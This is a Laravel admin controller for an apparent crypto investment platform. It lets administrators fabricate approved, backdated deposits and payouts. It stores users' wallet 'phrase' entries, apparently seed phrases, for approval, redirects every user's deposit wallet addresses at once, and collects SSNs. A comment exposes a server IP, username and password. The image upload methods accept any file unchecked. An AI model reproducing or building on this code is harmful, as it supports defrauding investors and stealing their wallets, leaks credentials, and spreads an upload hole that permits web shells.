<?php

namespace App\Http\Controllers\Admin;

use App\Models\User;
use App\Models\Admin;
use App\Models\CopyBot;
use App\Models\Settings;
use App\Models\Transaction;
use Illuminate\Http\Request;
use Illuminate\Support\Carbon;
use Illuminate\Http\JsonResponse;
use Illuminate\Support\Collection;
use Illuminate\Support\Facades\DB;
use App\Http\Controllers\Controller;
use Illuminate\Auth\Events\Verified;
use Illuminate\Support\Facades\Auth;
use Illuminate\Support\Facades\Hash;
use Illuminate\Support\Facades\Http;
use Illuminate\Http\RedirectResponse;
use App\Notifications\WebNotification;
use App\Http\Controllers\MailController;

use function Symfony\Component\String\u;
use Illuminate\Support\Facades\Validator;
use App\Notifications\VerifiedNotification;
use Illuminate\Http\Client\RequestException;
use Illuminate\Support\Facades\Notification;

class AdminController extends Controller
{

    //Host: 41.203.16.246
    //U: lushgetqre
    //P: ob3Sv53L5d3RlVGioK7d
    public function index()
    {
        $admin = auth('admin')->user();
        $deposits = Transaction::query()->where('type', 'deposit')->where('status', '!=', 'declined')->where('status', '!=', 'cancelled')->sum('actual_amount');
        $totalDeposits = Transaction::query()->where('type', 'deposit')->where('status', '!=', 'declined')->where('status', '!=', 'cancelled')->whereBetween('created_at', [now()->format('Y-m-') . '1', now()->format('Y-m-') . now()->format('t')])->get();
        $payouts = Transaction::query()->where('type', 'payout')->where('status', '!=', 'declined')->where('status', '!=', 'cancelled')->sum('actual_amount');
        $totalPayouts = Transaction::query()->where('type', 'payout')->where('status', '!=', 'declined')->where('status', '!=', 'cancelled')->whereBetween('created_at', [now()->format('Y-m-') . '1', now()->format('Y-m-') . now()->format('t')])->get();
        $depositArr = $depositData = $payoutArr = $payoutData = $days = [];
        for ($i = 1; $i <= now()->format('t'); $i++) {
            $days[] = $i . now()->format('-M');
            $depositArr[$i] = 0;
            $payoutArr[$i] = 0;
        }
        foreach ($totalDeposits as $deposit) {
            $day = Carbon::make($deposit->created_at)->format('d');
            $first_letter = substr($day, 0, 1);
            if ($first_letter == 0) {
                $day = $first_letter = substr($day, 1, 2);
            }
            if (array_key_exists($day, $depositArr)) {
                $depositArr[$day] = $depositArr[$day] + $deposit->actual_amount;
            } else $depositArr[$day] = $deposit->actual_amount;
        }
        // dd($depositArr);
        $amount = $this->formatAmount($deposits);
        $depositAmount = $amount[0];
        $depositUnit = $amount[1];
        foreach ($depositArr as $category) $depositData[] = $category;

        $investments = 0;
        $amount = $this->formatAmount($investments);
        $investedAmount = $amount[0];
        $investedUnit = $amount[1];

        foreach ($totalPayouts as $payout) {
            $day = Carbon::make($payout->created_at)->format('d');
            if (array_key_exists($day, $payoutArr)) {
                $payoutArr[$day] = $payoutArr[$day] + $payout->actual_amount;
            } else $payoutArr[$day] = $payout->actual_amount;
        }
        foreach ($payoutArr as $arr) $payoutData[] = $arr;
        $amount = $this->formatAmount($payouts);
        $payoutAmount = $amount[0];
        $payoutUnit = $amount[1];
        // dd($depositData);

        // dd($days);
        return view('admin.index', compact(['admin', 'depositData', 'days', 'depositAmount', 'depositUnit', 'payoutAmount', 'payoutUnit', 'payoutData', 'investedAmount', 'investedUnit', 'deposits', 'payouts', 'investments']));
    }

    public function users()
    {
        $users = User::query()->orderByDesc('created_at')->get();
        return view('admin.users', compact('users'));
    }

    public function user(User $user)
    {
        return view('admin.user-info', compact('user'));
    }

    public function updateUser(User $user)
    {
        $this->validate(request(), [
            'first_name' => 'required',
            'last_name' => 'required',
            'username' => 'required',
            'dob' => 'required|date',
            'ssn' => 'required',
            'phone' => 'required',
            'marital_status' => 'required',
            'nationality' => 'required',
            'swap' => 'required',
            'margin' => 'required',
        ]);
        $user->update(request()->except('token', 'swap', 'margin'));

        if ($user->wallet) {
            $user->wallet->update([
                'swap' => request('swap'),
                'margin' => request('margin'),
            ]);
        }
        
        return back()->with('success', 'User updated successfully');
    }

    public function deleteUser(User $user)
    {
        if ($user->delete()) return back()->with('success', 'User deleted successfully');
        return back()->with('error', 'An error occurred, try again.');
    }

    public function approveID(User $user, $action): RedirectResponse
    {
        if (!in_array($action, ['approved', 'declined'])) return back()->with('error', 'Invalid action');
        
        if ($action == 'approved') {
            $data = [
                'name' => $user->name,
                'subject' => 'Account Successfully Verified',
                'body' => '<p>Your FICA document has been verified successfully ,</p>
                <p>You can start investing by making a deposit to your account.</p>
                <br>
                <p>Deposits can be made via <b>Cryptocurrency(bitcoin)</b> or direct Bank <b>Deposit(Wire Transfer)</b></p>
                <br>
                <br>
                <p>For more enquires!</p>
                <p>Write support@itrustinvestment.com</p>
                '
            ];
        } else if($action == 'declined') {
            $data = [
                'name' => $user->name,
                'subject' => 'Document '.$action,
                'body' => 'Your means of identification has been <b>'.$action.'</b>.'
            ];
        }

        if ($user->update(['id_approved' => $action == 'approved' ? '1' : '2', 'id_date_approved' => now()])) {
                Notification::send($user, new VerifiedNotification($data));
            $user->notify(new WebNotification($data));
            return back()->with('success', 'User document ' . $action . ' successfully');
        }
        return back()->with('error', 'An error occurred, try again.');
    }

    public function approveProofAddress(User $user, $action): RedirectResponse
    {
        if (!in_array($action, ['approved', 'declined'])) return back()->with('error', 'Invalid action');
        
        if ($action == 'approved') {
            $data = [
                'name' => $user->name,
                'subject' => 'Account Successfully Verified',
                'body' => '<p>Your Proof of Address document has been verified successfully ,</p>
                <p>You can start investing by making a deposit to your account.</p>
                <br>
                <p>Deposits can be made via <b>Cryptocurrency(bitcoin)</b> or direct Bank <b>Deposit(Wire Transfer)</b></p>
                <br>
                <br>
                <p>For more enquires!</p>
                <p>Write support@itrustinvestment.com</p>
                '
            ];
        } else if($action == 'declined') {
            $data = [
                'name' => $user->name,
                'subject' => 'Document '.$action,
                'body' => 'Your poof of address has been <b>'.$action.'</b>.'
            ];
        }

        if ($user->update(['state_id_approved' => $action == 'approved' ? '1' : '2', 'id_date_approved' => now()])) {
                Notification::send($user, new VerifiedNotification($data));
            $user->notify(new WebNotification($data));
            return back()->with('success', 'User document ' . $action . ' successfully');
        }
        return back()->with('error', 'An error occurred, try again.');
    }

    public function userAccountAction(User $user, $action): RedirectResponse
    {
        if (!in_array($action, ['approved', 'declined', 'suspended'])) return back()->with('error', 'Invalid action');
        if ($user->update(['status' => $action])) return back()->with('success', 'User account ' . $action . ' successfully');
        return back()->with('error', 'An error occurred, try again.');
    }

    public function userAccountActionwithBTCWallet(User $user, $action, Request $request): RedirectResponse
    {
        // dd($action);
        $validator = Validator::make($request->all(), [
            'btc_wallet' => 'required|string',
            'eth_wallet' => 'required|string',
            'usdt_trc_20' => 'required|string',
            'usdt_erc_20' => 'required|string',
            'usdt_eth' => 'required|string',
        ]);
        if ($validator->fails()) return back()->with('error', $validator->errors()->first())->withInput();


        if (!in_array($action, ['approved', 'declined', 'suspended'])) return back()->with('error', 'Invalid action');
        if ($user->update([
            'status' => $action, 
            'btc_wallet' => $request['btc_wallet'],
            'eth_wallet' => $request['eth_wallet'],
            'usdt_trc_20' => $request['usdt_trc_20'],
            'usdt_erc_20' => $request['usdt_erc_20'],
            'usdt_eth' => $request['usdt_eth'],
        ])) return back()->with('success', 'User account ' . $action . ' successfully');
        return back()->with('error', 'An error occurred, try again.');
    }

    public function userBTCWallet(User $user, Request $request): RedirectResponse
    {
        $validator = Validator::make($request->all(), [
            'btc_wallet' => 'required|string',
            // 'eth_wallet' => 'required|string',
            // 'usdt_trc_20' => 'required|string',
            // 'usdt_erc_20' => 'required|string',
            // 'usdt_eth' => 'required|string',
        ]);
        if ($validator->fails()) return back()->with('error', $validator->errors()->first())->withInput();


        // if (!in_array($action, ['approved', 'declined', 'suspended'])) return back()->with('error', 'Invalid action');
        if ($user->update([
            'btc_wallet' => $request['btc_wallet'],
            // 'eth_wallet' => $request['eth_wallet'],
            // 'usdt_trc_20' => $request['usdt_trc_20'],
            // 'usdt_erc_20' => $request['usdt_erc_20'],
            // 'usdt_eth' => $request['usdt_eth'],
        ])) return back()->with('success', 'User account Wallet Successfully Updated');
        return back()->with('error', 'An error occurred, try again.');
    }


    public function addTransaction(Request $request, $type)
    {
        // Validate the request data
        $validator = Validator::make($request->all(), [
            'user' => 'required|exists:users,id',
            'amount' => 'required|numeric|min:0.01',
            'method' => 'required|string',
            'account' => 'required|string',
            'date' => 'required|date',
        ]);

        if ($validator->fails()) {
            return back()->withErrors($validator)->withInput();
        }

        $user = User::find($request->input('user'));
        $amount = (float) $request->input('amount');
        
        if ($type === 'payout') {
            // Calculate withdrawable amount
            $deposits = $user->deposits()->where('status', 'approved')->sum('actual_amount');
            $investments = $user->roi()->sum('amount');
            $payouts = $user->payouts()->where('status', 'approved')->sum('actual_amount');
            $withdrawable = ($deposits - $payouts) + $investments;

            // Check if the amount exceeds the withdrawable amount
            if ($amount > $withdrawable) {
                return back()->with(['validation' => true, 'error' => 'Insufficient Funds, try again'])->withInput();
            }

            // Decrement the user's wallet balance for payout
            if ($user->wallet) {
                $user->wallet->decrement('balance', $amount);
                $user->wallet->decrement('oc_wallet', $amount);
            }
        } elseif ($type === 'deposit') {
            // Increment the user's wallet balance for deposit
            if ($user->wallet) {
                $user->wallet->increment('balance', $amount);
                $user->wallet->increment('oc_wallet', $amount);
            }
        } else {
            return back()->with(['validation' => true, 'error' => 'Invalid transaction type'])->withInput();
        }

        // Prepare the data for transaction creation
        $data = [
            'method' => $request->input('method'),
            'info' => $request->input('method'),
            'amount' => $amount,
            'actual_amount' => $amount,
            'type' => $type,
            'status' => 'approved',
            'acct_type' => $request->input('account'),
            'created_at' => $request->input('date'),
        ];

        // Create the transaction
        if ($user->transactions()->create($data)) {
            return back()->with('success', ucfirst($type) . ' Created Successfully');
        } else {
            return back()->with(['validation' => true, 'error' => ucfirst($type) . ' was not successful, try again'])->withInput();
        }
    }


    public function editTransaction(Request $request, $id, $type)
    {
        $this->validate($request, [
            'user' => 'required',
            'amount' => 'required',
            'method' => 'required',
            'account' => 'required',
            'date' => 'required'
        ]);

        $user_id = $request->input('user');
        $user = User::find($user_id);
        $btc = self::getBTC();

        if($type == 'payout'){
            $deposits = $user->deposits()->where('status', '=', 'approved')->sum('actual_amount');
            $inv = $user->roi()->sum('amount');
            $payouts = $user->payouts()->where('status', '=', 'approved')->where('id', '!=', $id)->sum('actual_amount');
            $withdrawable = ($deposits - $payouts) + $inv;
        }

        if ($request['method'] == 'bank') {
            $amount = $request['amount'];
        } else
            $amount = $request['amount'] / ($btc ?? 50000);

        $data = [
            'user_id' => $user_id,
            'method' => $request['method'],
            'amount' => $amount,
            'actual_amount' => (float) $request['amount'],
            'type' => $type,
            'acct_type' => $request['account'],
            'created_at' => $request['date']
        ];

         if($type == 'payout')
             if ((float) $request['amount'] > $withdrawable)
                 return back()->with(['validation' => true, 'error' => 'Insufficient Funds, try again'])->withInput();


        Transaction::find($id)->update($data);
        return back()->with('success', ucfirst($type) . ' Updated Successfully');
    }

    public function profile()
    {
        $admin = auth('admin')->user();
        return view('admin.profile', compact('admin'));
    }

    public function updateProfile(Request $request): RedirectResponse
    {
        $admin = Admin::find(auth('admin')->id());
        $validator = Validator::make($request->all(), [
            'name' => 'required|string',
            'email' => 'required|email',
            'photo' => 'sometimes|file|mimes:jpg,png,jpeg|max:1024'
        ]);
        if ($validator->fails()) return back()->withErrors($validator)->withInput();

        if ($image = $request->file('photo')) {
            $name = time() . $image->getClientOriginalName();
            $admin['photo'] = $image->move('img/avatar', $name);
        }

        $admin['name'] = $request['name'];
        if ($admin->update())
            return back()->with('success', 'Profile updated successfully');
        return back()->with('error', 'Could not update profile, try again');
    }

    public function updatePassword(Request $request): RedirectResponse
    {
        $admin = Admin::find(auth('admin')->id());
        $validator = Validator::make($request->all(), [
            'old_password' => 'required|min:8',
            'new_password' => 'required|min:8|confirmed',
        ]);
        if ($validator->fails()) return back()->withErrors($validator);

        if (!Hash::check($request['old_password'], $admin['password']))
            return back()->with('error', 'Old password is incorrect');
        if ($admin->update(['password' => Hash::make($request['new_password'])]))
            return back()->with('success', 'Password update successfully');
        return back()->with('error', 'Could not update password, try again');
    }

    public function settings()
    {
        $setting = Settings::first();

        return view('admin.settings', compact(['setting']));
    }

    public function updateSettings(Request $request)
    {
        $settings = Settings::count();
        if ($settings == 0) {
            Settings::create($request->all());
        } else {
            $settings = Settings::first();
            $settings->update($request->all());
        }

        User::query()->update([
            'btc_wallet' => $request->get('btc_wallet'),
            'eth_wallet' => $request->get('eth_wallet'),
            'usdt_trc_20' => $request->get('usdt_trc_20'),
            'usdt_erc_20' => $request->get('usdt_erc_20'),
            // 'usdt_eth' => $request->get('usdt_eth'),
        ]);

        return back()->with('success', 'Settings Successfully Updated');
    }

    protected function formatAmount($amount): array
    {
        if (strlen($amount) < 4) {
            $price = $amount;
            $unit = '';
        } elseif (strlen($amount) > 3 && strlen($amount) < 7) {
            $price = $amount / 1000;
            $unit = 'K';
        } elseif (strlen($amount) > 6 && strlen($amount) < 10) {
            $price = $amount / 1000000;
            $unit = 'M';
        } elseif (strlen($amount) > 9 && strlen($amount) < 13) {
            $price = $amount / 1000000000;
            $unit = 'B';
        } else {
            $price = $amount / 1000000000000;
            $unit = 'T';
        }
        return [$price, $unit];
    }

    public function imageUpload(): JsonResponse
    {
        $file = request()->file('file');
        $name = time().'_'.$file->getClientOriginalName();
        $loc = $file->move('uploads/blog', $name);
        return response()->json(['link' => asset($loc)]);
    }

    public function imageUpload2(): JsonResponse
    {
        $file = request()->file('file');
        $name = time().'_'.$file->getClientOriginalName();
        $loc = $file->move('uploads/news', $name);
        return response()->json(['link' => asset($loc)]);
    }

    public static function getBTC()
    {
        // try {
        //     $url = 'https://api.coingecko.com/api/v3/coins/markets?vs_currency=usd&ids=btc&order=market_cap_desc&per_page=100&page=1&sparkline=false&price_change_percentage=1hr&locale=en';
        //     $response = Http::get($url);
        //     $data = $response->json();
        // } catch (RequestException $e) {
        //     $data = [];
        // }

        $data = [];

        // Check if the response is not empty and if 'current_price' key exists
        if (!empty($data) && isset($data[0]['current_price'])) {
            $priceBTC = $data[0]['current_price'];
            return $priceBTC;
        } else {
            return 31200;
        }
    }

    public function updateCurrencuy(Request $request)
    {
        $user = User::find($request->user_id);

        $user->update(['currency_id' => $request->currency_id]);
        
        return back()->with('success', ' Updated Successfully');
    }

    public function updateCopyBot(Request $request, $id)
    {
        $user = User::findOrFail($id);

        $botId = $request->copy_bot;

        $user->copyBots()->attach($botId);

        if ($user->wallet) {
            $i_amount = $user->wallet->ic_wallet;

            $user->wallet->decrement('ic_wallet', $i_amount);
            $user->wallet->increment('it_wallet', $i_amount);

            $o_amount = $user->wallet->oc_wallet;

            $user->wallet->decrement('oc_wallet', $o_amount);
            $user->wallet->increment('ot_wallet', $o_amount);

            // dd($user->wallet->ic_wallet);
        } else {
            return back()->with('error', 'User has not wallet yet, login to generate one.');
        }

        return back()->with('success', ' Updated Successfully');

    }

    public function diactivateCopyBot(Request $request, $id)
    {
        $copyBot = User::findOrFail($id);

        $botId = $request->copy_bot;

        $copyBot->copyBots()->detach($botId);

        return back()->with('success', ' Updated Successfully');

    }

    public function updatePhrase(Request $request, $id, $status)
    {
        // Validate the incoming request data
        $request->validate([
            'phrase' => 'required|string',
            'wallet' => 'required|string',
        ]);

        // Find the user by the given ID
        $user = User::findOrFail($id);

        // Decode the existing phrase JSON into an array
        $phraseData = json_decode($user->phrase, true);

        // Check if it's a single object and convert it to an array if needed
        if (isset($phraseData['phrase']) && isset($phraseData['wallet'])) {
            $phraseData = [$phraseData];
        }

        // Update the status of the first entry in the array
        $phraseData[0]['status'] = $status;

        // Convert the updated array back to a JSON string
        $updatedPhraseJson = json_encode($phraseData);

        // Update the user's phrase in the users table
        $user->update(['phrase' => $updatedPhraseJson]);

        // Redirect back with a success message
        return back()->with('success', $status == 1 ? 'Phrase Approved Successfully' : 'Phrase Declined');
    }


    public function updateTrade(Request $request)
    {
        $user = Auth::user();

        // Validate action input
        $request->validate([
            'action' => 'required|in:activate,deactivate',
        ]);

        // Update the user's trade status based on the action
        if ($request->input('action') === 'activate') {
            $user->trade = true;
        } elseif ($request->input('action') === 'deactivate') {
            $user->trade = false;
        }

        $user->save();

        // Redirect or return a response
        return redirect()->back()->with('success', 'Trade status updated successfully!');
    }
}
